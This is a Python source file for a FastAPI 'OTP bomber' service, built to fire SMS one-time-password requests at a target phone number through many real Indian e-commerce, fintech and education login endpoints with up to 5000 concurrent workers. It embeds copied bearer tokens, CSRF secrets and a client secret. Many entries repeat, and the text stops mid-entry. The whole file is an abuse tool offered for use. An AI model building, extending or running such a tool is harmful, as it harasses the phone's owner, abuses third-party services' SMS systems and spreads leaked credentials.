#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════╗
║   🔥 ULTIMATE OTP BOMBER API v5.0 — ALL-IN-ONE          ║
║   ▸ 120+ APIs (Real + New)                              ║
║   ▸ 5000 Concurrent Workers                             ║
║   ▸ Render / Vercel / Railway Ready                     ║
║   ▸ Netlify Frontend Support                            ║
║   ▸ uvloop + Super Flash                                ║
╚══════════════════════════════════════════════════════════╝
"""

import asyncio
import time
from datetime import datetime
from uuid import uuid4
from collections import defaultdict

import aiohttp
from fastapi import FastAPI, BackgroundTasks, Query
from fastapi.responses import JSONResponse, HTMLResponse
from fastapi.middleware.cors import CORSMiddleware
import uvicorn

try:
    import uvloop
    uvloop.install()
    print("✅ uvloop enabled")
except ImportError:
    print("⚠️  uvloop not installed (optional)")

# ═══════════════════════════════════════════════════════════
# 🚀 APP
# ═══════════════════════════════════════════════════════════
app = FastAPI(title="ULTIMATE OTP BOMBER API v5.0")
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# ═══════════════════════════════════════════════════════════
# ⚙️ SETTINGS — SUPER FLASH
# ═══════════════════════════════════════════════════════════
MAX_CONCURRENT  = 5000
BATCH_CHUNK     = 1000
REQUEST_TIMEOUT = 9
CONNECT_TIMEOUT = 10

OTP_KEYWORDS = (
    "success", "sent", "otp", "message", "ok", "true",
    "verified", "delivered", "sent successfully",
)

_running_jobs = {}
_stop_numbers = set()
_global_stats = defaultdict(lambda: {
    "total": 0, "http_ok": 0, "otp_ok": 0, "failed": 0, "start": 0
})

# ═══════════════════════════════════════════════════════════
# 📋 ALL APIS (Old + 16 New) — 120+ ENDPOINTS
# ═══════════════════════════════════════════════════════════
ULTIMATE_APIS = [
    
    # ══════════════ NEW APIS ADDED (Based on User Request) ══════════════
      {
        "name": "zestmoney",
        "url": "https://authentication.zestmoney.in/v2/mobile/otp/",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "token": "135b043150475d7288b936606e086af5c1fb7f0eff15256748f5ad078ebdcf85",
            "Origin": "https://app.zestmoney.in",
            "Referer": "https://app.zestmoney.in/"
        },
        "data": lambda p: f'{{"MobileNumber":"91{p}","MessageParams":{{"MerchantKey":"null"}}}}'
    },
    {
        "name": "bewakoof",
        "url": "https://api-prod.bewakoof.com/v3/user/auth/login/otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "api-token": "NGNlNTUwYTc0MjBjYzQzZTdiZTNhMmY1NjNhMThhOGU6OGI1NThkZDgtOGQ5ZS00OWYxLTk4MDAtNzYxMGEzOGNjYzNk",
            "x-client-device-token": "NGNlNTUwYTc0MjBjYzQzZTdiZTNhMmY1NjNhMThhOGU6OGI1NThkZDgtOGQ5ZS00OWYxLTk4MDAtNzYxMGEzOGNjYzNk",
            "x-origin-host": "api-prod.bewakoof.com/v3/user/auth/login/otp",
            "Origin": "https://www.bewakoof.com",
            "Referer": "https://www.bewakoof.com/"
        },
        "data": lambda p: f'{{"mobile":"{p}","country_code":"+91"}}'
    },
    {
        "name": "eurekaforbes",
        "url": "https://www.eurekaforbes.com/api/public/ecom/v1/otp/send",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/91.0 Mobile Safari/537.36",
            "Content-Type": "application/json"
        },
        "data": lambda p: f'{{"mobile_number":"{p}"}}'
    },
    {
        "name": "bookmyshow",
        "url": "https://in.bookmyshow.com/api/members/otp/send",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "x-app-code": "WEBV2",
            "x-geohash": "te7",
            "x-region-slug": "mumbai",
            "x-latitude": "19.12175",
            "x-longitude": "72.8504",
            "x-platform-code": "WEBV2",
            "x-region-code": "MUMBAI",
            "Origin": "https://in.bookmyshow.com",
            "Referer": "https://in.bookmyshow.com/login/otp?referer=/my-profile&refresh=true&source=web"
        },
        "data": lambda p: f'{{"channel":"phone","subChannel":"sms","details":{{"phone":"{p}","origin":"https://in.bookmyshow.com","isdCountryCode":"IN","isdCode":"+91"}}}}'
    },
    {
        "name": "pharmeasy_apt",
        "url": "https://pharmeasy.in/apt-api/login/send-otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://pharmeasy.in",
            "Referer": "https://pharmeasy.in/"
        },
        "data": lambda p: f'{{"param":"{p}"}}'
    },
    {
        "name": "dailyhunt",
        "url": "https://dailyhunt.in/api/pwa",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Origin": "https://dailyhunt.in",
            "Referer": "https://dailyhunt.in/news/india/english/login/mobile-verification?mode=pwa&onlyLogin=true"
        },
        "data": lambda p: f'{{"method":"POST","body":{{"mobileNo":"91-{p}"}},"url":"http://dh-ugc-users.dailyhunt.in//api/v1/internal/pwa/accounts/generate/otp"}}'
    },
    {
        "name": "cordelia",
        "url": "https://api-pro.cordeliacruises.com/auth/b2c/generate-otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "Origin": "https://www.cordeliacruises.com",
            "Referer": "https://www.cordeliacruises.com/"
        },
        "data": lambda p: f'{{"phoneNumber":"{p}","countryCode":"+91","website":"https://www.cordeliacruises.com/login","pageCode":"login"}}'
    },
    {
        "name": "urbanladder",
        "url": "https://www.urbanladder.com/api/service/application/user/authentication/v1.0/login/otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "authorization": "Bearer NjVmNDM3ZmFlNzg4NTEwMjg3MDdkYWVlOmI0ZEZvd2ZRSw==",
            "Origin": "https://www.urbanladder.com",
            "Referer": "https://www.urbanladder.com/auth/login"
        },
        "data": lambda p: f'{{"mobile":"{p}","country_code":"91","captcha_code":"grimlock_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0IjoxNzY5NDQwNTQyNjAyfQ.4sY-nJ89czQEY0MYp2hT1sRH0ADY9c1LE-AuC-hIHbY"}}'
    },
    {
        "name": "mamaearth_gokwik",
        "url": "https://gkx.gokwik.co/kp/api/v1/auth/otp/send",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc2OTUyNjQ3MSwiZXhwIjoxNzY5NTI2NTMxfQ.HLM1KyRImw0paDZMBYkFdm-6E1pQco_GitAdrUqrgy8",
            "gk-request-id": "51c1169f-3c41-4b75-ac29-47e1e3b9d25d",
            "kp-request-id": "ad5d18a8-824f-4a47-a5cf-6f732151c2dc",
            "gk-merchant-id": "12wyqc26spoknx0kv7t",
            "Origin": "https://mamaearth.in",
            "Referer": "https://mamaearth.in/"
        },
        "data": lambda p: f'{{"phone":"{p}","country":"in","country_code":"+91"}}'
    },
    {
        "name": "allen",
        "url": "https://api.allen-live.in/api/v1/auth/sendOtp?center_id&source=home-page-login",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "x-device-id": "29eeb510-774d-47e6-9606-19142305f562",
            "x-client-type": "mweb",
            "Origin": "https://allen.in",
            "Referer": "https://allen.in/"
        },
        "data": lambda p: f'{{"country_code":"91","phone_number":"{p}","persona_type":"STUDENT","otp_type":"SHARED_DEFAULT"}}'
    },
    {
        "name": "snapdeal",
        "url": "https://m.snapdeal.com/signupCompleteAjax",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json;charset=UTF-8",
            "Origin": "https://m.snapdeal.com",
            "Referer": "https://m.snapdeal.com/signin"
        },
        "data": lambda p: f'{{"j_password":null,"j_mobilenumber":"{p}","agree":true,"j_confpassword":null,"journey":"mobile","numberEdit":false,"j_fullname":"Guest","swp":true}}'
    },
    {
        "name": "fabindia",
        "url": "https://apisap.fabindia.com/occ/v2/fabindiab2c/otp/generate?lang=en&curr=INR",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "authorization": "bearer yYo1wwUV1B1yUqYeo4YrbKF5WNI",
            "Origin": "https://www.fabindia.com",
            "Referer": "https://www.fabindia.com/"
        },
        "data": lambda p: f'{{"mobileDailCode":"+91","mobileNumber":"{p}","isLogin":false,"isSignUp":false}}'
    },
    {
        "name": "shoppersstop",
        "url": "https://api-sscom-preprod.ssecom.tech/v2/olg/sendOTP",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "Origin": "https://www.shoppersstop.com",
            "Referer": "https://www.shoppersstop.com/"
        },
        "data": lambda p: f'{{"mobile":"{p}","type":"SIGNIN_WITH_MOBILE"}}'
    },
    {
        "name": "olx",
        "url": "https://www.olx.in/api/auth/authenticate?lang=en-IN",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "x-panamera-client-id": "web-mobile",
            "Origin": "https://www.olx.in",
            "Referer": "https://www.olx.in/en-in"
        },
        "data": lambda p: f'{{"grantType":"phone","phone":"+91{p}","language":"en-IN"}}'
    },
    {
        "name": "zepto_v2",
        "url": "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json; charset=UTF-8",
            "x-csrf-secret": "uD0aoNYI_ZA",
            "platform": "WEB",
            "Origin": "https://www.zepto.com",
            "Referer": "https://www.zepto.com/"
        },
        "data": lambda p: f'{{"mobileNumber":"{p}"}}'
    },
    {
        "name": "aakash",
        "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "x-client-id": "a6fbf1d2-27c3-46e1-b149-0380e506b763",
            "Origin": "https://www.aakash.ac.in",
            "Referer": "https://www.aakash.ac.in/"
        },
        "data": lambda p: f'{{"mobile_psid":"{p}","mobile_number":"","activity_type":"aakash-myadmission","webengageData":{{"profile":"student","whatsapp_opt_in":true,"method":"mobile"}}}}'
    },
    {
        "name": "myntra_gateway",
        "url": "https://www.myntra.com/gateway/v1/auth/getotp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "x-meta-app": "deviceId=1719ab7b-4693-4a04-8985-61f250ee1bf5;appFamily=Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36;reqChannel=mweb;channel=web;",
            "deviceid": "1719ab7b-4693-4a04-8985-61f250ee1bf5",
            "x-myntraweb": "Yes",
            "x-location-context": "pincode=781002;source=IP",
            "x-requested-with": "browser",
            "origin": "https://www.myntra.com",
            "referer": "https://www.myntra.com/login?referer=https%3A%2F%2Fwww.myntra.com%2Fmy%2Fdashboard"
        },
        "data": lambda p: f'{{"phoneNumber":"{p}","signup":"ONECLICK"}}'
    },
    {
        "name": "cordelia_cruises",
        "url": "https://api-pro.cordeliacruises.com/auth/b2c/generate-otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "origin": "https://www.cordeliacruises.com",
            "referer": "https://www.cordeliacruises.com/"
        },
        "data": lambda p: f'{{"phoneNumber":"{p}","countryCode":"+91","website":"https://www.cordeliacruises.com/upcoming-cruises","pageCode":"login"}}'
    },
    {
        "name": "gokwik_v3",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "gk-version": "20260122163136947",
            "gk-timestamp": "58981024",
            "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc2OTQzMDczNiwiZXhwIjoxNzY5NDMwNzk2fQ.uioTFtFeWVOTNOLZU5o5JFii1QQV-XI-PLRO8XtTPVM",
            "gk-signature": "292114",
            "gk-udf-1": "684",
            "kp-integration-type": "PLUGIN",
            "gk-request-id": "556fc4c5-9562-46fe-ae1d-7148e3299005",
            "gk-merchant-id": "19g6illukf2pz",
            "origin": "https://pdp.gokwik.co",
            "referer": "https://pdp.gokwik.co/"
        },
        "data": lambda p: f'{{"phone":"{p}","country":"IN"}}'
    },
    {
        "name": "snapdeal_signup",
        "url": "https://m.snapdeal.com/signupCompleteAjax",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://m.snapdeal.com",
            "referer": "https://m.snapdeal.com/signin"
        },
        "data": lambda p: f'{{"j_password":null,"j_mobilenumber":"{p}","agree":true,"j_confpassword":null,"journey":"mobile","numberEdit":false,"j_fullname":"Guest","swp":true}}'
    },
    {
        "name": "nykaafashion_otp",
        "url": "https://www.nykaafashion.com/webscripts/api/otp/generate",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "x-csrf-token": "VhUNo81xmmF6kwoK",
            "origin": "https://www.nykaafashion.com",
            "referer": "https://www.nykaafashion.com/my-account?nav=my_account"
        },
        "data": lambda p: f'{{"customer_mobile":"{p}"}}'
    },
    {
        "name": "fabindia_otp",
        "url": "https://apisap.fabindia.com/occ/v2/fabindiab2c/otp/generate?lang=en&curr=INR",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "authorization": "bearer yYo1wwUV1B1yUqYeo4YrbKF5WNI",
            "origin": "https://www.fabindia.com",
            "referer": "https://www.fabindia.com/"
        },
        "data": lambda p: f'{{"mobileDailCode":"+91","mobileNumber":"{p}","isLogin":false,"isSignUp":false}}'
    },
    {
        "name": "shoppersstop_otp",
        "url": "https://api-sscom-preprod.ssecom.tech/v2/olg/sendOTP",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "origin": "https://www.shoppersstop.com",
            "referer": "https://www.shoppersstop.com/"
        },
        "data": lambda p: f'{{"mobile":"{p}","type":"SIGNIN_WITH_MOBILE"}}'
    },
    {
        "name": "olx_authenticate",
        "url": "https://www.olx.in/api/auth/authenticate?lang=en-IN",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "x-panamera-client-id": "web-mobile",
            "x-panamera-client-version": "11.24.1",
            "origin": "https://www.olx.in",
            "referer": "https://www.olx.in/en-in"
        },
        "data": lambda p: f'{{"grantType":"phone","phone":"+91{p}","language":"en-IN"}}'
    },
    {
        "name": "tatadigital_check",
        "url": "https://api.tatadigital.com/api/v3/sso/check-phone",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "client_id": "TCP-WEB-APP",
            "client_secret": "6fe27bd7-658d-4d28-ab66-a71da9637529",
            "neu-app-version": "6.1.0",
            "anonymous_id": "33d6b700-f6e0-4467-ab04-c4421670e82b",
            "origin": "https://www.tataneu.com",
            "referer": "https://www.tataneu.com/"
        },
        "data": lambda p: f'{{"countryCode":"91","phone":"{p}","referralCode":"","sendOtp":true}}'
    },
    {
        "name": "bigbasket_otp",
        "url": "https://www.bigbasket.com/member-tdl/v3/member/otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
            "x-caller": "Monster-SVC",
            "referring-client": "https://www.bigbasket.com",
            "x-tracker": "cbb828e2-b08f-45e5-81f8-f3a7a71106af",
            "x-channel": "BB-PWA",
            "origin": "https://www.bigbasket.com"
        },
        "data": lambda p: f'{{"identifier":"{p}","referrer":"unified_login","recaptchaToken":""}}'
    },
    {
        "name": "zepto_send_otp",
        "url": "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json",
            "content-type": "application/json; charset=UTF-8",
            "platform": "WEB",
            "x-csrf-secret": "uD0aoNYI_ZA",
            "origin": "https://www.zepto.com",
            "referer": "https://www.zepto.com/"
        },
        "data": lambda p: f'{{"mobileNumber":"{p}"}}'
    },
    {
        "name": "pepperfry_otp",
        "url": "https://www.pepperfry.com/api/account/auth/sentOtp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "platform": "wap_mob",
            "source": "wap",
            "origin": "https://www.pepperfry.com",
            "referer": "https://www.pepperfry.com/"
        },
        "data": lambda p: f'{{"mobile":"{p}","mobile_country":"+91","token":""}}'
    },
    {
        "name": "croma_check_phone",
        "url": "https://api.tatadigital.com/api/v2/sso/check-phone-croma",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "client_id": "CROMA-WEB-APP",
            "origin": "https://www.croma.com",
            "referer": "https://www.croma.com/"
        },
        "data": lambda p: f'{{"countryCode":"91","phone":"{p}"}}'
    },
    {
        "name": "eurekaforbes_otp",
        "url": "https://www.eurekaforbes.com/api/public/ecom/v1/otp/send",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "client": "web",
            "origin": "https://www.eurekaforbes.com",
            "referer": "https://www.eurekaforbes.com/login"
        },
        "data": lambda p: f'{{"mobile_number":"{p}"}}'
    },
    {
        "name": "zestmoney_otp",
        "url": "https://authentication.zestmoney.in/v2/mobile/otp/",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
            "token": "135b043150475d7288b936606e086af5c1fb7f0eff15256748f5ad078ebdcf85",
            "origin": "https://app.zestmoney.in",
            "referer": "https://app.zestmoney.in/"
        },
        "data": lambda p: f'{{"MobileNumber":"91{p}","MessageParams":{{"MerchantKey":"null"}}}}'
    },
    {
        "name": "urbanladder_otp",
        "url": "https://www.urbanladder.com/api/service/application/user/authentication/v1.0/login/otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "authorization": "Bearer NjVmNDM3ZmFlNzg4NTEwMjg3MDdkYWVlOmI0ZEZvd2ZRSw==",
            "origin": "https://www.urbanladder.com",
            "referer": "https://www.urbanladder.com/auth/login"
        },
        "data": lambda p: f'{{"mobile":"{p}","country_code":"91","captcha_code":"grimlock_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0IjoxNzY5NDQwNTQyNjAyfQ.4sY-nJ89czQEY0MYp2hT1sRH0ADY9c1LE-AuC-hIHbY"}}'
    },
    {
        "name": "mamaearth_gokwik",
        "url": "https://gkx.gokwik.co/kp/api/v1/auth/otp/send",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc2OTUyNjQ3MSwiZXhwIjoxNzY5NTI2NTMxfQ.HLM1KyRImw0paDZMBYkFdm-6E1pQco_GitAdrUqrgy8",
            "gk-request-id": "51c1169f-3c41-4b75-ac29-47e1e3b9d25d",
            "kp-request-id": "ad5d18a8-824f-4a47-a5cf-6f732151c2dc",
            "gk-merchant-id": "12wyqc26spoknx0kv7t",
            "origin": "https://mamaearth.in",
            "referer": "https://mamaearth.in/"
        },
        "data": lambda p: f'{{"phone":"{p}","country":"in","country_code":"+91"}}'
    },
    {
        "name": "allen_send_otp",
        "url": "https://api.allen-live.in/api/v1/auth/sendOtp?center_id&source=home-page-login",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
            "x-device-id": "29eeb510-774d-47e6-9606-19142305f562",
            "x-client-type": "mweb",
            "origin": "https://allen.in",
            "referer": "https://allen.in/"
        },
        "data": lambda p: f'{{"country_code":"91","phone_number":"{p}","persona_type":"STUDENT","otp_type":"SHARED_DEFAULT"}}'
    },
    {
        "name": "maxfashion_otp",
        "url": "https://www.maxfashion.in/in/en/mobilelogin/sendOTP",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
            "content-type": "application/json;",
            "origin": "https://www.maxfashion.in",
            "referer": "https://www.maxfashion.in/in/en/"
        },
        "data": lambda p: f'{{"signInMobile":"+91{p}"}}'
    },
    {
        "name": "lifestylestores_otp",
        "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
            "content-type": "application/json;",
            "origin": "https://www.lifestylestores.com",
            "referer": "https://www.lifestylestores.com/in/en/"
        },
        "data": lambda p: f'{{"signInMobile":"+91{p}"}}'
    },
    {
        "name": "sparindia_otp",
        "url": "https://www.sparindia.com/api/get-otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3Njk1Mjc2MTcsImV4cCI6MTc2OTUyNzkxN30.m1KkAzXZANYyYRXfaBV8ogoo0VBpP-6lASO5ygw0TFI",
            "origin": "https://www.sparindia.com",
            "referer": "https://www.sparindia.com/"
        },
        "data": lambda p: f'{{"mobile_number":"{p}","finalStore":"view_20011"}}'
    },
    {
        "name": "hotstar_login",
        "url": "https://www.hotstar.com/api/internal/bff/v2/freshstart/pages/1/spaces/1/widgets/8?action=userRegistration",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "x-hs-platform": "mweb",
            "x-country-code": "in",
            "x-hs-accept-language": "eng",
            "origin": "https://www.hotstar.com",
            "referer": "https://www.hotstar.com/in/onboarding?ref=%2Fin"
        },
        "data": lambda p: f'{{"body":{{"@type":"type.googleapis.com/feature.login.InitiatePhoneLoginRequest","initiate_by":0,"recaptcha_token":"","phone_number":"{p}"}}}}'
    },
    {
        "name": "dailyhunt_pwa",
        "url": "https://dailyhunt.in/api/pwa",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
            "origin": "https://dailyhunt.in",
            "referer": "https://dailyhunt.in/news/india/english/login/mobile-verification?mode=pwa&onlyLogin=true"
        },
        "data": lambda p: f'{{"method":"POST","body":{{"mobileNo":"91-{p}"}},"url":"http://dh-ugc-users.dailyhunt.in//api/v1/internal/pwa/accounts/generate/otp"}}'
    },
    {
        "name": "justdial_sendvcode",
        "url": "https://www.justdial.com/api/india_api_write/20march2020/sendvcode.php?wap=2&resend=0&randtime=1769573201013&qid={p}-02026000010002800009000360004200009-50105373614400053736000820000360000024&t_and_c=1&source=2&version=6.4&enc=1&env=p",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "origin": "https://www.justdial.com",
            "referer": "https://www.justdial.com/login?from=sidemenu_hmpge&redirect=/&scllogin=1"
        },
        "data": lambda p: f'{{"mobile":"{p}","fname":""}}'
    },
    {
        "name": "pharmeasy_apt_otp",
        "url": "https://pharmeasy.in/apt-api/login/send-otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "origin": "https://pharmeasy.in",
            "referer": "https://pharmeasy.in/"
        },
        "data": lambda p: f'{{"param":"{p}"}}'
    },
    {
        "name": "netmeds_otp",
        "url": "https://www.netmeds.com/api/service/application/user/authentication/v1.0/login/otp?platform=65f562c1504a59a67f529ad4",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "authorization": "Bearer NjVmNTYyYzE1MDRhNTlhNjdmNTI5YWQ0Ol9VLW9oSTRJeQ==",
            "origin": "https://www.netmeds.com",
            "referer": "https://www.netmeds.com/auth/login?redirectUrl=%2Fc%2Fmy-accounts"
        },
        "data": lambda p: f'{{"mobile":"{p}","country_code":"91"}}'
    },
    {
        "name": "bookmyshow_otp",
